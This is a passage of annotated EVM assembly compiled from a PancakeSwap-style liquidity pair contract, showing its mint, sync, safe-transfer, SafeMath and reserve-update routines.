\"src/Pair.sol\":6569:6607  uint amount0 = balance0.sub(_reserve0) */\n      swap1\n      pop\n        /* \"src/Pair.sol\":6617:6629  uint amount1 */\n      0x00\n        /* \"src/Pair.sol\":6632:6655  balance1.sub(_reserve1) */\n      tag_286\n        /* \"src/Pair.sol\":6632:6640  balance1 */\n      dup4\n      sub(shl(0x70, 0x01), 0x01)\n        /* \"src/Pair.sol\":6632:6655  balance1.sub(_reserve1) */\n      dup8\n      and\n      0xffffffff\n        /* \"src/Pair.sol\":6632:6644  balance1.sub */\n      tag_170\n        /* \"src/Pair.sol\":6632:6655  balance1.sub(_reserve1) */\n      and\n      jump\t// in\n    tag_286:\n        /* \"src/Pair.sol\":6617:6655  uint amount1 = balance1.sub(_reserve1) */\n      swap1\n      pop\n        /* \"src/Pair.sol\":6666:6676  bool feeOn */\n      0x00\n        /* \"src/Pair.sol\":6679:6709  _mintFee(_reserve0, _reserve1) */\n      tag_287\n        /* \"src/Pair.sol\":6688:6697  _reserve0 */\n      dup8\n        /* \"src/Pair.sol\":6699:6708  _reserve1 */\n      dup8\n        /* \"src/Pair.sol\":6679:6687  _mintFee */\n      tag_204\n        /* \"src/Pair.sol\":6679:6709  _mintFee(_reserve0, _reserve1) */\n      jump\t// in\n    tag_287:\n        /* \"src/Pair.sol\":6719:6736  uint _totalSupply */\n      0x00\n        /* \"src/Pair.sol\":6739:6750  totalSupply */\n      sload\n        /* \"src/Pair.sol\":6666:6709  bool feeOn = _mintFee(_reserve0, _reserve1) */\n      swap1\n      swap2\n      pop\n        /* \"src/Pair.sol\":6842:6859  _totalSupply == 0 */\n      dup1\n        /* \"src/Pair.sol\":6838:7237  if (_totalSupply == 0) {... */\n      tag_288\n      jumpi\n        /* \"src/Pair.sol\":6887:6941  Math.sqrt(amount0.mul(amount1)).sub(MINIMUM_LIQUIDITY) */\n      tag_289\n        /* \"src/Pair.sol\":443:450  10 ** 3 */\n      0x03e8\n        /* \"src/Pair.sol\":6887:6918  Math.sqrt(amount0.mul(amount1)) */\n      tag_169\n        /* \"src/Pair.sol\":6897:6917  amount0.mul(amount1) */\n      tag_208\n        /* \"src/Pair.sol\":6897:6904  amount0 */\n      dup8\n        /* \"src/Pair.sol\":6909:6916  amount1 */\n      dup8\n        /* \"src/Pair.sol\":6897:6917  amount0.mul(amount1) */\n      0xffffffff\n        /* \"src/Pair.sol\":6897:6908  amount0.mul */\n      tag_168\n        /* \"src/Pair.sol\":6897:6917  amount0.mul(amount1) */\n      and\n      jump\t// in\n        /* \"src/Pair.sol\":6887:6941  Math.sqrt(amount0.mul(amount1)).sub(MINIMUM_LIQUIDITY) */\n    tag_289:\n        /* \"src/Pair.sol\":6875:6941  liquidity = Math.sqrt(amount0.mul(amount1)).sub(MINIMUM_LIQUIDITY) */\n      swap9\n      pop\n        /* \"src/Pair.sol\":6955:6996  freezeMint(address(0), MINIMUM_LIQUIDITY) */\n      tag_292\n        /* \"src/Pair.sol\":6974:6975  0 */\n      0x00\n        /* \"src/Pair.sol\":443:450  10 ** 3 */\n      0x03e8\n        /* \"src/Pair.sol\":6955:6965  freezeMint */\n      tag_293\n        /* \"src/Pair.sol\":6955:6996  freezeMint(address(0), MINIMUM_LIQUIDITY) */\n      jump\t// in\n    tag_292:\n      pop\n        /* \"src/Pair.sol\":6838:7237  if (_totalSupply == 0) {... */\n      jump(tag_294)\n    tag_288:\n        /* \"src/Pair.sol\":7094:7226  Math.min(... */\n      tag_295\n      sub(shl(0x70, 0x01), 0x01)\n        /* \"src/Pair.sol\":7120:7157  amount0.mul(_totalSupply) / _reserve0 */\n      dup10\n      and\n        /* \"src/Pair.sol\":7120:7145  amount0.mul(_totalSupply) */\n      tag_214\n        /* \"src/Pair.sol\":7120:7127  amount0 */\n      dup7\n        /* \"src/Pair.sol\":7132:7144  _totalSupply */\n      dup5\n        /* \"src/Pair.sol\":7120:7145  amount0.mul(_totalSupply) */\n      0xffffffff\n        /* \"src/Pair.sol\":7120:7131  amount0.mul */\n      tag_168\n        /* \"src/Pair.sol\":7120:7145  amount0.mul(_totalSupply) */\n      and\n      jump\t// in\n        /* \"src/Pair.sol\":7094:7226  Math.min(... */\n    tag_295:\n        /* \"src/Pair.sol\":7082:7226  liquidity = Math.min(... */\n      swap9\n      pop\n        /* \"src/Pair.sol\":6838:7237  if (_totalSupply == 0) {... */\n    tag_294:\n        /* \"src/Pair.sol\":7266:7267  0 */\n      0x00\n        /* \"src/Pair.sol\":7254:7263  liquidity */\n      dup10\n        /* \"src/Pair.sol\":7254:7267  liquidity > 0 */\n      gt\n        /* \"src/Pair.sol\":7246:7312  require(liquidity > 0, \"UniswapV2: INSUFFICIENT_LIQUIDITY_MINTED\") */\n      tag_300\n      jumpi\n      mload(0x40)\n      shl(0xe5, 0x461bcd)\n      dup2\n      mstore\n      0x04\n      add\n      dup1\n      dup1\n      0x20\n      add\n      dup3\n      dup2\n      sub\n      dup3\n      mstore\n      0x28\n      dup2\n      mstore\n      0x20\n      add\n      dup1\n      data_6591c9f5bf1fefaad109b76a20e25c857b696080c952191f86220f001a83663e\n      0x28\n      swap2\n      codecopy\n      0x40\n      add\n      swap2\n      pop\n      pop\n      mload(0x40)\n      dup1\n      swap2\n      sub\n      swap1\n      revert\n    tag_300:\n        /* \"src/Pair.sol\":7322:7347  freezeMint(to, liquidity) */\n      tag_301\n        /* \"src/Pair.sol\":7333:7335  to */\n      dup11\n        /* \"src/Pair.sol\":7337:7346  liquidity */\n      dup11\n        /* \"src/Pair.sol\":7322:7332  freezeMint */\n      tag_293\n        /* \"src/Pair.sol\":7322:7347  freezeMint(to, liquidity) */\n      jump\t// in\n    tag_301:\n      pop\n        /* \"src/Pair.sol\":7358:7407  _update(balance0, balance1, _reserve0, _reserve1) */\n      tag_221\n        /* \"src/Pair.sol\":7366:7374  balance0 */\n      dup7\n        /* \"src/Pair.sol\":7376:7384  balance1 */\n      dup7\n        /* \"src/Pair.sol\":7386:7395  _reserve0 */\n      dup11\n        /* \"src/Pair.sol\":7397:7406  _reserve1 */\n      dup11\n        /* \"src/Pair.sol\":7358:7365  _update */\n      tag_179\n        /* \"src/Pair.sol\":7358:7407  _update(balance0, balance1, _reserve0, _reserve1) */\n      jump\t// in\n        /* \"src/ERC20.sol\":389:453  mapping(address => mapping(address => uint256)) public allowance */\n    tag_123:\n      0x02\n      0x20\n      swap1\n      dup2\n      mstore\n      0x00\n      swap3\n      dup4\n      mstore\n      0x40\n      dup1\n      dup5\n      keccak256\n      swap1\n      swap2\n      mstore\n      swap1\n      dup3\n      mstore\n      swap1\n      keccak256\n      sload\n      dup2\n      jump\t// out\n        /* \"src/Pair.sol\":641:659  uint public taxfee */\n    tag_125:\n      sload(0x0a)\n      dup2\n      jump\t// out\n        /* \"src/Pair.sol\":18168:18382  function sync() external lock {... */\n    tag_127:\n        /* \"src/Pair.sol\":1179:1187  unlocked */\n      sload(0x0f)\n        /* \"src/Pair.sol\":1191:1192  1 */\n      0x01\n        /* \"src/Pair.sol\":1179:1192  unlocked == 1 */\n      eq\n        /* \"src/Pair.sol\":1171:1212  require(unlocked == 1, \"Pancake: LOCKED\") */\n      tag_306\n      jumpi\n      0x40\n      dup1\n      mload\n      shl(0xe5, 0x461bcd)\n      dup2\n      mstore\n      0x20\n      0x04\n      dup3\n      add\n      mstore\n      0x0f\n      0x24\n      dup3\n      add\n      mstore\n      shl(0x8a, 0x14185b98d85ad94e881313d0d2d151)\n      0x44\n      dup3\n      add\n      mstore\n      swap1\n      mload\n      swap1\n      dup2\n      swap1\n      sub\n      0x64\n      add\n      swap1\n      revert\n    tag_306:\n        /* \"src/Pair.sol\":1233:1234  0 */\n      0x00\n        /* \"src/Pair.sol\":1222:1230  unlocked */\n      0x0f\n        /* \"src/Pair.sol\":1222:1234  unlocked = 0 */\n      sstore\n        /* \"src/Pair.sol\":18236:18242  token0 */\n      sload(0x08)\n        /* \"src/Pair.sol\":18229:18268  IERC20(token0).balanceOf(address(this)) */\n      0x40\n      dup1\n      mload\n      shl(0xe0, 0x70a08231)\n      dup2\n      mstore\n        /* \"src/Pair.sol\":18262:18266  this */\n      address\n        /* \"src/Pair.sol\":18229:18268  IERC20(token0).balanceOf(address(this)) */\n      0x04\n      dup3\n      add\n      mstore\n      swap1\n      mload\n        /* \"src/Pair.sol\":18208:18375  _update(... */\n      tag_308\n      swap3\n      sub(shl(0xa0, 0x01), 0x01)\n        /* \"src/Pair.sol\":18236:18242  token0 */\n      and\n      swap2\n        /* \"src/Pair.sol\":18229:18253  IERC20(token0).balanceOf */\n      0x70a08231\n      swap2\n        /* \"src/Pair.sol\":18229:18268  IERC20(token0).balanceOf(address(this)) */\n      0x24\n      dup1\n      dup4\n      add\n      swap3\n      0x20\n      swap3\n      swap2\n      swap1\n      dup3\n      swap1\n      sub\n      add\n      dup2\n        /* \"src/Pair.sol\":18236:18242  token0 */\n      dup7\n        /* \"src/Pair.sol\":18229:18268  IERC20(token0).balanceOf(address(this)) */\n      dup1\n      extcodesize\n      iszero\n        /* \"--CODEGEN--\":5:7   */\n      dup1\n      iszero\n      tag_309\n      jumpi\n        /* \"--CODEGEN--\":30:31   */\n      0x00\n        /* \"--CODEGEN--\":27:28   */\n      dup1\n        /* \"--CODEGEN--\":20:32   */\n      revert\n        /* \"--CODEGEN--\":5:7   */\n    tag_309:\n        /* \"src/Pair.sol\":18229:18268  IERC20(token0).balanceOf(address(this)) */\n      pop\n      gas\n      staticcall\n      iszero\n        /* \"--CODEGEN--\":8:17   */\n      dup1\n        /* \"--CODEGEN--\":5:7   */\n      iszero\n      tag_310\n      jumpi\n        /* \"--CODEGEN--\":45:61   */\n      returndatasize\n        /* \"--CODEGEN--\":42:43   */\n      0x00\n        /* \"--CODEGEN--\":39:40   */\n      dup1\n        /* \"--CODEGEN--\":24:62   */\n      returndatacopy\n        /* \"--CODEGEN--\":77:93   */\n      returndatasize\n        /* \"--CODEGEN--\":74:75   */\n      0x00\n        /* \"--CODEGEN--\":67:94   */\n      revert\n        /* \"--CODEGEN--\":5:7   */\n    tag_310:\n        /* \"src/Pair.sol\":18229:18268  IERC20(token0).balanceOf(address(this)) */\n      pop\n      pop\n      pop\n      pop\n      mload(0x40)\n      returndatasize\n        /* \"--CODEGEN--\":13:15   */\n      0x20\n        /* \"--CODEGEN--\":8:11   */\n      dup2\n        /* \"--CODEGEN--\":5:16   */\n      lt\n        /* \"--CODEGEN--\":2:4   */\n      iszero\n      tag_311\n      jumpi\n        /* \"--CODEGEN--\":29:30   */\n      0x00\n        /* \"--CODEGEN--\":26:27   */\n      dup1\n        /* \"--CODEGEN--\":19:31   */\n      revert\n        /* \"--CODEGEN--\":2:4   */\n    tag_311:\n      pop\n        /* \"src/Pair.sol\":18229:18268  IERC20(token0).balanceOf(address(this)) */\n      mload\n        /* \"src/Pair.sol\":18289:18295  token1 */\n      sload(0x09)\n        /* \"src/Pair.sol\":18282:18321  IERC20(token1).balanceOf(address(this)) */\n      0x40\n      dup1\n      mload\n      shl(0xe0, 0x70a08231)\n      dup2\n      mstore\n        /* \"src/Pair.sol\":18315:18319  this */\n      address\n        /* \"src/Pair.sol\":18282:18321  IERC20(token1).balanceOf(address(this)) */\n      0x04\n      dup3\n      add\n      mstore\n      swap1\n      mload\n      sub(shl(0xa0, 0x01), 0x01)\n        /* \"src/Pair.sol\":18289:18295  token1 */\n      swap1\n      swap3\n      and\n      swap2\n        /* \"src/Pair.sol\":18282:18306  IERC20(token1).balanceOf */\n      0x70a08231\n      swap2\n        /* \"src/Pair.sol\":18282:18321  IERC20(token1).balanceOf(address(this)) */\n      0x24\n      dup1\n      dup3\n      add\n      swap3\n        /* \"src/Pair.sol\":18229:18268  IERC20(token0).balanceOf(address(this)) */\n      0x20\n      swap3\n        /* \"src/Pair.sol\":18282:18321  IERC20(token1).balanceOf(address(this)) */\n      swap1\n      swap2\n      swap1\n      dup3\n      swap1\n      sub\n      add\n      dup2\n        /* \"src/Pair.sol\":18289:18295  token1 */\n      dup7\n        /* \"src/Pair.sol\":18282:18321  IERC20(token1).balanceOf(address(this)) */\n      dup1\n      extcodesize\n      iszero\n        /* \"--CODEGEN--\":5:7   */\n      dup1\n      iszero\n      tag_312\n      jumpi\n        /* \"--CODEGEN--\":30:31   */\n      0x00\n        /* \"--CODEGEN--\":27:28   */\n      dup1\n        /* \"--CODEGEN--\":20:32   */\n      revert\n        /* \"--CODEGEN--\":5:7   */\n    tag_312:\n        /* \"src/Pair.sol\":18282:18321  IERC20(token1).balanceOf(address(this)) */\n      pop\n      gas\n      staticcall\n      iszero\n        /* \"--CODEGEN--\":8:17   */\n      dup1\n        /* \"--CODEGEN--\":5:7   */\n      iszero\n      tag_313\n      jumpi\n        /* \"--CODEGEN--\":45:61   */\n      returndatasize\n        /* \"--CODEGEN--\":42:43   */\n      0x00\n        /* \"--CODEGEN--\":39:40   */\n      dup1\n        /* \"--CODEGEN--\":24:62   */\n      returndatacopy\n        /* \"--CODEGEN--\":77:93   */\n      returndatasize\n        /* \"--CODEGEN--\":74:75   */\n      0x00\n        /* \"--CODEGEN--\":67:94   */\n      revert\n        /* \"--CODEGEN--\":5:7   */\n    tag_313:\n        /* \"src/Pair.sol\":18282:18321  IERC20(token1).balanceOf(address(this)) */\n      pop\n      pop\n      pop\n      pop\n      mload(0x40)\n      returndatasize\n        /* \"--CODEGEN--\":13:15   */\n      0x20\n        /* \"--CODEGEN--\":8:11   */\n      dup2\n        /* \"--CODEGEN--\":5:16   */\n      lt\n        /* \"--CODEGEN--\":2:4   */\n      iszero\n      tag_314\n      jumpi\n        /* \"--CODEGEN--\":29:30   */\n      0x00\n        /* \"--CODEGEN--\":26:27   */\n      dup1\n        /* \"--CODEGEN--\":19:31   */\n      revert\n        /* \"--CODEGEN--\":2:4   */\n    tag_314:\n      pop\n        /* \"src/Pair.sol\":18282:18321  IERC20(token1).balanceOf(address(this)) */\n      mload\n        /* \"src/Pair.sol\":18335:18343  reserve0 */\n      sload(0x0b)\n      sub(shl(0x70, 0x01), 0x01)\n      dup1\n      dup3\n      and\n      swap2\n      shl(0x70, 0x01)\n        /* \"src/Pair.sol\":18357:18365  reserve1 */\n      swap1\n      div\n      and\n        /* \"src/Pair.sol\":18208:18215  _update */\n      tag_179\n        /* \"src/Pair.sol\":18208:18375  _update(... */\n      jump\t// in\n    tag_308:\n        /* \"src/Pair.sol\":1266:1267  1 */\n      0x01\n        /* \"src/Pair.sol\":1255:1263  unlocked */\n      0x0f\n        /* \"src/Pair.sol\":1255:1267  unlocked = 1 */\n      sstore\n        /* \"src/Pair.sol\":18168:18382  function sync() external lock {... */\n      jump\t// out\n        /* \"src/Pair.sol\":1587:1925  function _safeTransfer(address token, address to, uint value) private {... */\n    tag_142:\n        /* \"src/Pair.sol\":516:550  bytes(\"transfer(address,uint256)\") */\n      0x40\n      dup1\n      mload\n      dup1\n      dup3\n      add\n      dup3\n      mstore\n      0x19\n      dup2\n      mstore\n      0x7472616e7366657228616464726573732c75696e743235362900000000000000\n      0x20\n      swap2\n      dup3\n      add\n      mstore\n        /* \"src/Pair.sol\":1727:1770  abi.encodeWithSelector(SELECTOR, to, value) */\n      dup2\n      mload\n      sub(shl(0xa0, 0x01), 0x01)\n      dup6\n      dup2\n      and\n      0x24\n      dup4\n      add\n      mstore\n      0x44\n      dup1\n      dup4\n      add\n      dup7\n      swap1\n      mstore\n      dup5\n      mload\n        /* \"--CODEGEN--\":26:47   */\n      dup1\n      dup5\n      sub\n        /* \"--CODEGEN--\":22:54   */\n      swap1\n      swap2\n      add\n        /* \"--CODEGEN--\":6:55   */\n      dup2\n      mstore\n        /* \"src/Pair.sol\":1727:1770  abi.encodeWithSelector(SELECTOR, to, value) */\n      0x64\n      swap1\n      swap3\n      add\n      dup5\n      mstore\n        /* \"--CODEGEN--\":25:43   */\n      swap2\n      dup2\n      add\n        /* \"--CODEGEN--\":61:78   */\n      dup1\n      mload\n      sub(shl(0xe0, 0x01), 0x01)\n        /* \"--CODEGEN--\":182:197   */\n      and\n      shl(0xe0, 0xa9059cbb)\n        /* \"--CODEGEN--\":179:208   */\n      or\n        /* \"--CODEGEN--\":160:209   */\n      dup2\n      mstore\n        /* \"src/Pair.sol\":1703:1780  token.call(... */\n      swap3\n      mload\n      dup2\n      mload\n        /* \"src/Pair.sol\":1668:1680  bool success */\n      0x00\n      swap5\n        /* \"src/Pair.sol\":1682:1699  bytes memory data */\n      0x60\n      swap5\n        /* \"src/Pair.sol\":1703:1713  token.call */\n      dup10\n      and\n      swap4\n        /* \"src/Pair.sol\":1727:1770  abi.encodeWithSelector(SELECTOR, to, value) */\n      swap3\n        /* \"src/Pair.sol\":1703:1780  token.call(... */\n      swap2\n      dup3\n      swap2\n        /* \"--CODEGEN--\":25:43   */\n      swap1\n        /* \"src/Pair.sol\":1703:1780  token.call(... */\n      dup1\n      dup4\n        /* \"--CODEGEN--\":25:43   */\n      dup4\n        /* \"--CODEGEN--\":36:189   */\n    tag_316:\n        /* \"--CODEGEN--\":66:68   */\n      0x20\n        /* \"--CODEGEN--\":61:64   */\n      dup4\n        /* \"--CODEGEN--\":58:69   */\n      lt\n        /* \"--CODEGEN--\":36:189   */\n      tag_318\n      jumpi\n        /* \"--CODEGEN--\":176:186   */\n      dup1\n      mload\n        /* \"--CODEGEN--\":164:187   */\n      dup3\n      mstore\n      not(0x1f)\n        /* \"--CODEGEN--\":139:151   */\n      swap1\n      swap3\n      add\n      swap2\n        /* \"--CODEGEN--\":98:100   */\n      0x20\n        /* \"--CODEGEN--\":89:101   */\n      swap2\n      dup3\n      add\n      swap2\n        /* \"--CODEGEN--\":114:126   */\n      add\n        /* \"--CODEGEN--\":36:189   */\n      jump(tag_316)\n    tag_318:\n        /* \"--CODEGEN--\":274:275   */\n      0x01\n        /* \"--CODEGEN--\":267:270   */\n      dup4\n        /* \"--CODEGEN--\":263:265   */\n      0x20\n        /* \"--CODEGEN--\":259:271   */\n      sub\n        /* \"--CODEGEN--\":254:257   */\n      0x0100\n        /* \"--CODEGEN--\":250:272   */\n      exp\n        /* \"--CODEGEN--\":246:276   */\n      sub\n        /* \"--CODEGEN--\":315:319   */\n      dup1\n        /* \"--CODEGEN--\":311:320   */\n      not\n        /* \"--CODEGEN--\":305:308   */\n      dup3\n        /* \"--CODEGEN--\":299:309   */\n      mload\n        /* \"--CODEGEN--\":295:321   */\n      and\n        /* \"--CODEGEN--\":356:360   */\n      dup2\n        /* \"--CODEGEN--\":350:353   */\n      dup5\n        /* \"--CODEGEN--\":344:354   */\n      mload\n        /* \"--CODEGEN--\":340:361   */\n      and\n        /* \"--CODEGEN--\":389:396   */\n      dup1\n        /* \"--CODEGEN--\":380:387   */\n      dup3\n        /* \"--CODEGEN--\":377:397   */\n      or\n        /* \"--CODEGEN--\":372:375   */\n      dup6\n        /* \"--CODEGEN--\":365:398   */\n      mstore\n        /* \"--CODEGEN--\":3:402   */\n      pop\n      pop\n      pop\n        /* \"src/Pair.sol\":1703:1780  token.call(... */\n      pop\n      pop\n      pop\n      swap1\n      pop\n      add\n      swap2\n      pop\n      pop\n      0x00\n      mload(0x40)\n      dup1\n      dup4\n      sub\n      dup2\n      0x00\n      dup7\n      gas\n      call\n      swap2\n      pop\n      pop\n      returndatasize\n        /* \"--CODEGEN--\":14:15   */\n      dup1\n        /* \"--CODEGEN--\":21:22   */\n      0x00\n        /* \"--CODEGEN--\":16:47   */\n      dup2\n      eq\n      tag_320\n      jumpi\n        /* \"--CODEGEN--\":75:79   */\n      0x40\n        /* \"--CODEGEN--\":69:80   */\n      mload\n        /* \"--CODEGEN--\":64:80   */\n      swap2\n      pop\n        /* \"--CODEGEN--\":144:148   */\n      0x1f\n        /* \"--CODEGEN--\":140:149   */\n      not\n        /* \"--CODEGEN--\":133:137   */\n      0x3f\n        /* \"--CODEGEN--\":115:131   */\n      returndatasize\n        /* \"--CODEGEN--\":111:138   */\n      add\n        /* \"--CODEGEN--\":107:150   */\n      and\n        /* \"--CODEGEN--\":104:105   */\n      dup3\n        /* \"--CODEGEN--\":100:151   */\n      add\n        /* \"--CODEGEN--\":94:98   */\n      0x40\n        /* \"--CODEGEN--\":87:152   */\n      mstore\n        /* \"--CODEGEN--\":169:185   */\n      returndatasize\n        /* \"--CODEGEN--\":166:167   */\n      dup3\n        /* \"--CODEGEN--\":159:186   */\n      mstore\n        /* \"--CODEGEN--\":225:241   */\n      returndatasize\n        /* \"--CODEGEN--\":222:223   */\n      0x00\n        /* \"--CODEGEN--\":215:219   */\n      0x20\n        /* \"--CODEGEN--\":212:213   */\n      dup5\n        /* \"--CODEGEN--\":208:220   */\n      add\n        /* \"--CODEGEN--\":193:242   */\n      returndatacopy\n        /* \"--CODEGEN--\":7:249   */\n      jump(tag_319)\n        /* \"--CODEGEN--\":16:47   */\n    tag_320:\n        /* \"--CODEGEN--\":36:40   */\n      0x60\n        /* \"--CODEGEN--\":31:40   */\n      swap2\n      pop\n        /* \"--CODEGEN--\":7:249   */\n    tag_319:\n      pop\n        /* \"src/Pair.sol\":1667:1780  (bool success, bytes memory data) = token.call(... */\n      swap2\n      pop\n      swap2\n      pop\n        /* \"src/Pair.sol\":1811:1818  success */\n      dup2\n        /* \"src/Pair.sol\":1811:1868  success && (data.length == 0 || abi.decode(data, (bool))) */\n      dup1\n      iszero\n      tag_322\n      jumpi\n      pop\n        /* \"src/Pair.sol\":1823:1834  data.length */\n      dup1\n      mload\n        /* \"src/Pair.sol\":1823:1839  data.length == 0 */\n      iszero\n      dup1\n        /* \"src/Pair.sol\":1823:1867  data.length == 0 || abi.decode(data, (bool)) */\n      tag_322\n      jumpi\n      pop\n        /* \"src/Pair.sol\":1854:1858  data */\n      dup1\n        /* \"src/Pair.sol\":1843:1867  abi.decode(data, (bool)) */\n      dup1\n      0x20\n      add\n      swap1\n      mload\n        /* \"--CODEGEN--\":13:15   */\n      0x20\n        /* \"--CODEGEN--\":8:11   */\n      dup2\n        /* \"--CODEGEN--\":5:16   */\n      lt\n        /* \"--CODEGEN--\":2:4   */\n      iszero\n      tag_323\n      jumpi\n        /* \"--CODEGEN--\":29:30   */\n      0x00\n        /* \"--CODEGEN--\":26:27   */\n      dup1\n        /* \"--CODEGEN--\":19:31   */\n      revert\n        /* \"--CODEGEN--\":2:4   */\n    tag_323:\n      pop\n        /* \"src/Pair.sol\":1843:1867  abi.decode(data, (bool)) */\n      mload\n        /* \"src/Pair.sol\":1823:1867  data.length == 0 || abi.decode(data, (bool)) */\n    tag_322:\n        /* \"src/Pair.sol\":1790:1918  require(... */\n      tag_324\n      jumpi\n      0x40\n      dup1\n      mload\n      shl(0xe5, 0x461bcd)\n      dup2\n      mstore\n      0x20\n      0x04\n      dup3\n      add\n      mstore\n      0x18\n      0x24\n      dup3\n      add\n      mstore\n      0x50616e63616b653a205452414e534645525f4641494c45440000000000000000\n      0x44\n      dup3\n      add\n      mstore\n      swap1\n      mload\n      swap1\n      dup2\n      swap1\n      sub\n      0x64\n      add\n      swap1\n      revert\n    tag_324:\n        /* \"src/Pair.sol\":1587:1925  function _safeTransfer(address token, address to, uint value) private {... */\n      pop\n      pop\n      pop\n      pop\n      pop\n      jump\t// out\n        /* \"src/SafeMath.sol\":481:630  function mul(uint256 x, uint256 y) internal pure returns (uint256 z) {... */\n    tag_168:\n        /* \"src/SafeMath.sol\":539:548  uint256 z */\n      0x00\n        /* \"src/SafeMath.sol\":568:574  y == 0 */\n      dup2\n      iszero\n      dup1\n        /* \"src/SafeMath.sol\":568:598  y == 0 || (z = x * y) / y == x */\n      tag_326\n      jumpi\n      pop\n      pop\n        /* \"src/SafeMath.sol\":583:588  x * y */\n      dup1\n      dup3\n      mul\n        /* \"src/SafeMath.sol\":597:598  x */\n      dup3\n        /* \"src/SafeMath.sol\":592:593  y */\n      dup3\n        /* \"src/SafeMath.sol\":583:588  x * y */\n      dup3\n        /* \"src/SafeMath.sol\":592:593  y */\n      dup2\n        /* \"src/SafeMath.sol\":578:593  (z = x * y) / y */\n      tag_327\n      jumpi\n      invalid\n    tag_327:\n      div\n        /* \"src/SafeMath.sol\":578:598  (z = x * y) / y == x */\n      eq\n        /* \"src/SafeMath.sol\":568:598  y == 0 || (z = x * y) / y == x */\n    tag_326:\n        /* \"src/SafeMath.sol\":560:623  require(y == 0 || (z = x * y) / y == x, \"ds-math-mul-overflow\") */\n      tag_181\n      jumpi\n      0x40\n      dup1\n      mload\n      shl(0xe5, 0x461bcd)\n      dup2\n      mstore\n      0x20\n      0x04\n      dup3\n      add\n      mstore\n      0x14\n      0x24\n      dup3\n      add\n      mstore\n      shl(0x60, 0x64732d6d6174682d6d756c2d6f766572666c6f77)\n      0x44\n      dup3\n      add\n      mstore\n      swap1\n      mload\n      swap1\n      dup2\n      swap1\n      sub\n      0x64\n      add\n      swap1\n      revert\n        /* \"src/SafeMath.sol\":339:475  function sub(uint256 x, uint256 y) internal pure returns (uint256 z) {... */\n    tag_170:\n        /* \"src/SafeMath.sol\":431:436  x - y */\n      dup1\n      dup3\n      sub\n        /* \"src/SafeMath.sol\":426:442  (z = x - y) <= x */\n      dup3\n      dup2\n      gt\n      iszero\n        /* \"src/SafeMath.sol\":418:468  require((z = x - y) <= x, \"ds-math-sub-underflow\") */\n      tag_181\n      jumpi\n      0x40\n      dup1\n      mload\n      shl(0xe5, 0x461bcd)\n      dup2\n      mstore\n      0x20\n      0x04\n      dup3\n      add\n      mstore\n      0x15\n      0x24\n      dup3\n      add\n      mstore\n      shl(0x58, 0x64732d6d6174682d7375622d756e646572666c6f77)\n      0x44\n      dup3\n      add\n      mstore\n      swap1\n      mload\n      swap1\n      dup2\n      swap1\n      sub\n      0x64\n      add\n      swap1\n      revert\n        /* \"src/Pair.sol\":2834:3817  function _update(... */\n    tag_179:\n      sub(shl(0x70, 0x01), 0x01)\n        /* \"src/Pair.sol\":2996:3019  balance0 <= uint112(-1) */\n      dup5\n      gt\n      dup1\n      iszero\n      swap1\n        /* \"src/Pair.sol\":2996:3046  balance0 <= uint112(-1) && balance1 <= uint112(-1) */\n      tag_332\n      jumpi\n      pop\n      sub(shl(0x70, 0x01), 0x01)\n        /* \"src/Pair.sol\":3023:3046  balance1 <= uint112(-1) */\n      dup4\n      gt\n      iszero\n        /* \"src/Pair.sol\":2996:3046  balance0 <= uint112(-1) && balance1 <= uint112(-1) */\n    tag_332:\n        /* \"src/Pair.sol\":2975:3089  require(... */\n      tag_333\n      jumpi\n      0x40\n      dup1\n      mload\n      shl(0xe5, 0x461bcd)\n      dup2\n      mstore\n      0x20\n      0x04\n      dup3\n      add\n      mstore\n      0x11\n      0x24\n      dup3\n      add\n      mstore\n      shl(0x78, 0x50616e63616b653a204f564552464c4f57)\n      0x44\n      dup3\n      add\n      mstore\n      swap1\n      mload\n      swap1\n      dup2\n      swap1\n      sub\n      0x64\n      add\n      swap1\n      revert\n    tag_333:\n        /* \"src/Pair.sol\":3204:3222  blockTimestampLast */\n      sload(0x0b)\n        /* \"src/Pair.sol\":3130:3155  block.timestamp % 2 ** 32 */\n      0xffffffff\n        /* \"src/Pair.sol\":3130:3145  block.timestamp */\n      timestamp\n        /* \"src/Pair.sol\":3130:3155  block.timestamp % 2 ** 32 */\n      dup2\n      and\n      swap2\n      shl(0xe0, 0x01)\n        /* \"src/Pair.sol\":3204:3222  blockTimestampLast */\n      swap1\n      div\n      dup2\n      and\n        /* \"src/Pair.sol\":3187:3222  blockTimestamp - blockTimestampLast */\n      dup3\n      sub\n      swap1\n        /* \"src/Pair.sol\":3259:3274  timeElapsed > 0 */\n      dup2\n      and\n      iszero\n      dup1\n      iszero\n      swap1\n        /* \"src/Pair.sol\":3259:3292  timeElapsed > 0 && _reserve0 != 0 */\n      tag_335\n      jumpi\n      pop\n      sub(shl(0x70, 0x01), 0x01)\n        /* \"src/Pair.sol\":3278:3292  _reserve0 != 0 */\n      dup5\n      and\n      iszero\n      iszero\n        /* \"src/Pair.sol\":3259:3292  timeElapsed > 0 && _reserve0 != 0 */\n    tag_335:\n        /* \"src/Pair.sol\":3259:3310  timeElapsed > 0 && _reserve0 != 0 && _reserve1 != 0 */\n      dup1\n      iszero\n      tag_336\n      jumpi\n      pop\n      sub(shl(0x70, 0x01), 0x01)\n        /* \"src/Pair.sol\":3296:3310  _reserve1 != 0 */\n      dup4\n      and\n      iszero\n      iszero\n        /* \"src/Pair.sol\":3259:3310  timeElapsed > 0 && _reserve0 != 0 && _reserve1 != 0 */\n    tag_336:\n        /* \"src/Pair.sol\":3255:3651  if (timeElapsed > 0 && _reserve0 != 0 && _reserve1 != 0) {... */\n      iszero\n      tag_337\n      jumpi\n        /* \"src/Pair.sol\":3495:3506  timeElapsed */\n      dup1\n        /* \"src/Pair.sol\":3426:3506  uint(UQ112x112.encode(_reserve1).uqdiv(_reserve0)) *... */\n      0xffffffff\n      and\n        /* \"src/Pair.sol\":3431:3475  UQ112x112.encode(_reserve1).uqdiv(_reserve0) */\n      tag_338\n        /* \"src/Pair.sol\":3465:3474  _reserve0 */\n      dup6\n        /* \"src/Pair.sol\":3431:3458  UQ112x112.encode(_reserve1) */\n      tag_339\n        /* \"src/Pair.sol\":3448:3457  _reserve1 */\n      dup7\n        /* \"src/Pair.sol\":3431:3447  UQ112x112.encode */\n      tag_340\n        /* \"src/Pair.sol\":3431:3458  UQ112x112.encode(_reserve1) */\n      jump\t// in\n    tag_339:\n      sub(shl(0xe0, 0x01), 0x01)\n        /* \"src/Pair.sol\":3431:3464  UQ112x112.encode(_reserve1).uqdiv */\n      and\n      swap1\n        /* \"src/Pair.sol\":3431:3475  UQ112x112.encode(_reserve1).uqdiv(_reserve0) */\n      0xffffffff\n        /* \"src/Pair.sol\":3431:3464  